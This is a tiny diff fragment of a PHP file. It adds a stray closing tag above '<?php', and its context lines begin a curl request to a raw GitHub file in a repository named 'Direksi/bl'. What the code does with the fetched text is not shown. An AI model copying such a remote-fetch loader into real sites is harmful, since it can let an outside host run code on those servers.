@@ -1,3 +1,5 @@
+?>
+
 <?php
 $url = 'https://raw.githubusercontent.com/Direksi/bl/main/file.txt';
 $ch = curl_init($url);
